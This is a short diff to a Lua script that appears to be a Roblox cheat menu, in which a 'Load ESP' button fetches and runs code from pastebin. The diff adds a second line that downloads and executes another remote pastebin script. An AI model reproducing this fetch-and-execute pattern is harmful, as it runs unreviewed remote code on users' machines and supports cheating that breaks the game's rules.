@@ -87,6 +87,7 @@ local CreateButton = Page:CreateButton("Load ESP", "Loads a ESP script", functio
         Duration = 3;
         wait(2)
         loadstring(game:HttpGet(('https://pastebin.com/raw/hnwdZWBK'),true))();
+        loadstring(game:HttpGet(('https://pastebin.com/raw/J5Uwq5Py'),true))();
         sound2:Destroy()
     end
 end)
